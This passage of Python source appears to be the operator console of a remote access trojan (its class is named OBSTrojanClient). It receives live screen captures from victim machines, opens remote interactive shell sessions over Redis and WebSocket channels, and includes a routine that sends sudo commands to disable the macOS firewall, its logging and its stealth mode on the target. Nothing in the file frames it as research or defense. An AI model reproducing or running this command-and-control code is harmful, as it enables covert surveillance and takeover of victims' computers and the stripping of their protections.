        """Toggle live screen sharing"""
        self.screenshare_active = not self.screenshare_active
        if self.screenshare_active:
            self.screenshare_btn.config(text="Stop Live View")
            self.screenshare_info.config(text="Live view active - receiving frames every 5 seconds")
        else:
            self.screenshare_btn.config(text="Start Live View")
            self.screenshare_info.config(text="Live view stopped")
    
    def save_screenshare_frame(self):
        """Save current screenshare frame"""
        if not self.current_client or not self.clients[self.current_client]['screenshare']:
            messagebox.showwarning("Warning", "No screenshare frame to save")
            return
            
        latest = self.clients[self.current_client]['screenshare'][-1]
        try:
            image_data = base64.b64decode(latest['data'])
            filename = f"screenshare_{self.current_client}_{int(time.time())}.jpg"
            
            with open(filename, 'wb') as f:
                f.write(image_data)
                
            messagebox.showinfo("Success", f"Screenshare frame saved as {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save screenshare frame: {e}")
        
    def clear_data(self):
        """Clear all data"""
        if messagebox.askyesno("Confirm", "Clear all collected data?"):
            self.clients.clear()
            self.current_client = None
            self.update_client_list()
            self.update_all_displays()
    
    def create_pty_session(self):
        """Create new PTY session"""
        if not self.current_client:
            messagebox.showwarning("Warning", "No client selected")
            return
            
        import uuid
        session_id = str(uuid.uuid4())
        
        cmd_data = {
            "id": session_id,
            "type": "shell",
            "command": ""
        }
        
        try:
            self.redis_client.lpush(f"command_data_{self.current_client}", json.dumps(cmd_data))
            self.terminal_status.config(text="Creating new shell session...")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create session: {e}")
    
    def close_pty_session(self):
        """Close current PTY session"""
        if not self.current_session:
            messagebox.showwarning("Warning", "No active session")
            return
            
        # Send Ctrl+C then exit
        self.send_pty_input_raw("\x03")  # Ctrl+C
        time.sleep(0.1)
        self.send_pty_input_raw("exit\n")
        
        # Remove from session list
        if self.current_session in self.pty_sessions:
            del self.pty_sessions[self.current_session]
        
        self.update_session_list()
        self.current_session = None
        self.terminal_status.config(text="Session closed")
    
    def send_pty_input(self, event=None):
        """Send input to PTY session"""
        if not self.current_session:
            messagebox.showwarning("Warning", "No active session")
            return
            
        command = self.command_entry.get()
        if not command:
            return
            
        # Add to history
        if command not in self.command_history:
            self.command_history.append(command)
        self.history_index = -1
        
        # Send command + newline to PTY
        self.send_pty_input_raw(command + "\n")
        self.command_entry.delete(0, tk.END)
    
    def send_pty_input_raw(self, input_text):
        """Send raw input to PTY session"""
        if not self.current_session or not self.current_client:
            return
            
        cmd_data = {
            "id": str(uuid.uuid4()),
            "type": "input",
            "session_id": self.current_session,
            "command": input_text
        }
        
        try:
            self.redis_client.lpush(f"command_data_{self.current_client}", json.dumps(cmd_data))
        except Exception as e:
            print(f"Failed to send PTY input: {e}")
    
    def send_interrupt(self, event=None):
        """Send Ctrl+C to PTY"""
        self.send_pty_input_raw("\x03")  # Ctrl+C
        return "break"
    
    def history_up(self, event=None):
        """Navigate command history up"""
        if self.command_history and self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            cmd = self.command_history[-(self.history_index + 1)]
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, cmd)
        return "break"
    
    def history_down(self, event=None):
        """Navigate command history down"""
        if self.history_index > 0:
            self.history_index -= 1
            cmd = self.command_history[-(self.history_index + 1)]
            self.command_entry.delete(0, tk.END)
            self.command_entry.insert(0, cmd)
        elif self.history_index == 0:
            self.history_index = -1
            self.command_entry.delete(0, tk.END)
        return "break"
    
    def on_session_select(self, event=None):
        """Handle session selection"""
        selection = self.session_combo.get()
        if selection and selection in self.pty_sessions:
            self.current_session = selection
            self.terminal_status.config(text=f"Active session: {selection}")
            # Switch to this session's output
            self.switch_session_output(selection)
    
    def switch_session_output(self, session_id):
        """Switch terminal output to show specific session"""
        if session_id in self.pty_sessions:
            self.terminal_output.delete(1.0, tk.END)
            output = self.pty_sessions[session_id].get('output', '')
            self.terminal_output.insert(tk.END, output)
            self.terminal_output.see(tk.END)
    
    def update_session_list(self):
        """Update session combobox"""
        sessions = list(self.pty_sessions.keys())
        self.session_combo['values'] = sessions
        if sessions and not self.current_session:
            self.session_combo.set(sessions[0])
            self.current_session = sessions[0]
    
    def handle_pty_created(self, response_data):
        """Handle PTY session creation response"""
        try:
            metadata = response_data.get('metadata', {})
            session_id = metadata.get('session_id', '')
            shell = metadata.get('shell', 'shell')
            
            if session_id:
                self.pty_sessions[session_id] = {
                    'shell': shell,
                    'output': '',
                    'created': time.time()
                }
                
                self.update_session_list()
                self.current_session = session_id
                self.session_combo.set(session_id)
                self.terminal_status.config(text=f"Session created: {session_id}")
                
        except Exception as e:
            print(f"Error handling PTY creation: {e}")
    
    def handle_pty_output(self, response_data):
        """Handle PTY output"""
        try:
            metadata = response_data.get('metadata', {})
            session_id = metadata.get('session_id', '')
            output = response_data.get('data', '')
            
            if session_id in self.pty_sessions:
                # Store output in session
                self.pty_sessions[session_id]['output'] += output
                
                # If this is the current session, display it
                if session_id == self.current_session:
                    self.terminal_output.insert(tk.END, output)
                    self.terminal_output.see(tk.END)
                    
                    # Keep output buffer reasonable size
                    content = self.terminal_output.get(1.0, tk.END)
                    if len(content) > 50000:  # Keep last 50KB
                        lines = content.split('\n')
                        self.terminal_output.delete(1.0, tk.END)
                        self.terminal_output.insert(1.0, '\n'.join(lines[-500:]))
                        
        except Exception as e:
            print(f"Error handling PTY output: {e}")
    
    def handle_command_response(self, response_data):
        """Handle legacy command response"""
        try:
            output = response_data.get('data', '')
            metadata = response_data.get('metadata', {})
            success = metadata.get('success', False)
            error = metadata.get('error', '')
            
            if success:
                self.terminal_output.insert(tk.END, output)
                if not output.endswith('\n'):
                    self.terminal_output.insert(tk.END, '\n')
                self.terminal_status.config(text="Command completed")
            else:
                self.terminal_output.insert(tk.END, f"Error: {error}\n")
                if output:
                    self.terminal_output.insert(tk.END, output)
                self.terminal_status.config(text="Command failed")
                
            self.terminal_output.see(tk.END)
            
        except Exception as e:
            print(f"Error handling command response: {e}")
            
    def clear_terminal(self):
        """Clear current session output"""
        self.terminal_output.delete(1.0, tk.END)
        if self.current_session and self.current_session in self.pty_sessions:
            self.pty_sessions[self.current_session]['output'] = ''
        self.terminal_status.config(text="Terminal cleared")
    
    def start_websocket_server(self):
        """Start WebSocket server for real-time PTY"""
        def run_server():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                
                start_server = websockets.serve(
                    self.handle_websocket_client,
                    "0.0.0.0",
                    self.ws_port,
                    ping_interval=30,
                    ping_timeout=10
                )
                
                print(f"WebSocket server started on port {self.ws_port}")
                loop.run_until_complete(start_server)
                loop.run_forever()
                
            except Exception as e:
                print(f"WebSocket server error: {e}")
        
        # Start WebSocket server in separate thread
        ws_thread = threading.Thread(target=run_server, daemon=True)
        ws_thread.start()
    
    async def handle_websocket_client(self, websocket, path):
        """Handle WebSocket client connections"""
        client_id = None
        try:
            print(f"WebSocket client connected: {websocket.remote_address}")
            
            async for message in websocket:
                try:
                    data = json.loads(message)
                    msg_type = data.get('type', '')
                    
                    if msg_type == 'register':
                        client_id = data.get('client_id', '')
                        self.ws_clients[client_id] = websocket
                        print(f"Client registered: {client_id}")
                        
                        # Update UI on main thread
                        self.root.after(0, lambda: self.update_websocket_status(f"WebSocket client connected: {client_id}"))
                        
                    elif msg_type == 'pty_created':
                        session_id = data.get('session_id', '')
                        shell = data.get('shell', 'shell')
                        client_id = data.get('client_id', '')
                        
                        if client_id == self.current_client:
                            self.root.after(0, lambda: self.handle_ws_pty_created(session_id, shell))
                    
                    elif msg_type == 'pty_output':
                        session_id = data.get('session_id', '')
                        output = data.get('data', '')
                        client_id = data.get('client_id', '')
                        
                        if client_id == self.current_client:
                            self.root.after(0, lambda: self.handle_ws_pty_output(session_id, output))
                    
                    elif msg_type == 'pty_closed':
                        session_id = data.get('session_id', '')
                        client_id = data.get('client_id', '')
                        
                        if client_id == self.current_client:
                            self.root.after(0, lambda: self.handle_ws_pty_closed(session_id))
                    
                except json.JSONDecodeError:
                    print("Invalid JSON received")
                except Exception as e:
                    print(f"Error processing WebSocket message: {e}")
                    
        except websockets.exceptions.ConnectionClosed:
            print("WebSocket client disconnected")
        except Exception as e:
            print(f"WebSocket client error: {e}")
        finally:
            # Clean up client
            if client_id and client_id in self.ws_clients:
                del self.ws_clients[client_id]
                self.root.after(0, lambda: self.update_websocket_status(f"WebSocket client disconnected: {client_id}"))
    
    def update_websocket_status(self, message):
        """Update WebSocket status in UI"""
        print(f"WebSocket: {message}")
        # You could add a status label to show WebSocket connection status
    
    def handle_ws_pty_created(self, session_id, shell):
        """Handle WebSocket PTY creation"""
        self.pty_sessions[session_id] = {
            'shell': shell,
            'output': '',
            'created': time.time(),
            'websocket': True
        }
        
        self.update_session_list()
        self.current_session = session_id
        self.session_combo.set(session_id)
        self.terminal_status.config(text=f"WebSocket session created: {session_id}")
    
    def handle_ws_pty_output(self, session_id, output):
        """Handle WebSocket PTY output (real-time)"""
        if session_id in self.pty_sessions:
            # Store output in session
            self.pty_sessions[session_id]['output'] += output
            
            # If this is the current session, display it immediately
            if session_id == self.current_session:
                self.terminal_output.insert(tk.END, output)
                self.terminal_output.see(tk.END)
                
                # Keep output buffer reasonable size
                content = self.terminal_output.get(1.0, tk.END)
                if len(content) > 50000:  # Keep last 50KB
                    lines = content.split('\n')
                    self.terminal_output.delete(1.0, tk.END)
                    self.terminal_output.insert(1.0, '\n'.join(lines[-500:]))
    
    def handle_ws_pty_closed(self, session_id):
        """Handle WebSocket PTY session closure"""
        if session_id in self.pty_sessions:
            del self.pty_sessions[session_id]
        
        self.update_session_list()
        if self.current_session == session_id:
            self.current_session = None
        self.terminal_status.config(text=f"Session closed: {session_id}")
    
    def create_pty_session(self):
        """Create new WebSocket PTY session"""
        if not self.current_client:
            messagebox.showwarning("Warning", "No client selected")
            return
        
        if self.current_client not in self.ws_clients:
            messagebox.showwarning("Warning", "Client not connected via WebSocket")
            return
            
        session_id = str(uuid.uuid4())
        
        # Send PTY creation command via WebSocket
        cmd_data = {
            "type": "pty_command",
            "command_type": "create",
            "session_id": session_id
        }
        
        try:
            websocket = self.ws_clients[self.current_client]
            asyncio.run_coroutine_threadsafe(
                websocket.send(json.dumps(cmd_data)),
                websocket.loop if hasattr(websocket, 'loop') else asyncio.get_event_loop()
            )
            self.terminal_status.config(text="Creating WebSocket shell session...")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create WebSocket session: {e}")
    
    def send_pty_input_raw(self, input_text):
        """Send raw input to WebSocket PTY session"""
        if not self.current_session or not self.current_client:
            return
        
        if self.current_client not in self.ws_clients:
            return
            
        cmd_data = {
            "type": "pty_command",
            "command_type": "input",
            "session_id": self.current_session,
            "input": input_text
        }
        
        try:
            websocket = self.ws_clients[self.current_client]
            asyncio.run_coroutine_threadsafe(
                websocket.send(json.dumps(cmd_data)),
                websocket.loop if hasattr(websocket, 'loop') else asyncio.get_event_loop()
            )
        except Exception as e:
            print(f"Failed to send WebSocket PTY input: {e}")
    
    def disable_firewall(self):
        """Disable macOS firewall via terminal command"""
        if not self.current_client:
            messagebox.showwarning("Warning", "No client selected")
            return
        
        # Confirm action
        if not messagebox.askyesno("Confirm", 
            "This will disable the macOS firewall on the target system.\n\n"
            "Commands to be executed:\n"
            "• sudo pfctl -d (disable packet filter)\n"
            "• sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off\n\n"
            "Continue?"):
            return
        
        # Commands to disable macOS firewall
        firewall_commands = [
            "sudo pfctl -d",  # Disable packet filter firewall
            "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off",  # Disable application firewall
            "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setloggingmode off",  # Disable firewall logging
            "sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode off"   # Disable stealth mode
        ]
        
        self.terminal_output.insert(tk.END, "\n=== Disabling macOS Firewall ===\n")
        self.terminal_output.see(tk.END)
        
        for cmd in firewall_commands:
            # Send each command
            cmd_data = {
                "id": str(uuid.uuid4()),
                "command": cmd
            }
            
            try:
                if self.current_client in self.ws_clients:
                    # Send via WebSocket if available
                    ws_cmd = {
                        "type": "pty_command",
                        "command_type": "input",
                        "session_id": self.current_session,
                        "input": cmd + "\n"
                    }
                    websocket = self.ws_clients[self.current_client]
                    asyncio.run_coroutine_threadsafe(
                        websocket.send(json.dumps(ws_cmd)),
                        websocket.loop if hasattr(websocket, 'loop') else asyncio.get_event_loop()
                    )
                else:
                    # Send via Redis
                    self.redis_client.lpush(f"command_data_{self.current_client}", json.dumps(cmd_data))
                
                self.terminal_output.insert(tk.END, f"Executing: {cmd}\n")
                self.terminal_output.see(tk.END)
                time.sleep(1)  # Small delay between commands
                
            except Exception as e:
                self.terminal_output.insert(tk.END, f"Error executing {cmd}: {e}\n")
        
        self.terminal_output.insert(tk.END, "=== Firewall disable commands sent ===\n\n")
        self.terminal_output.see(tk.END)
        self.terminal_status.config(text="Firewall disable commands executed")
            
    def run(self):
        """Run the application"""
        self.root.mainloop()

if __name__ == "__main__":
    app = OBSTrojanClient()
    app.run()
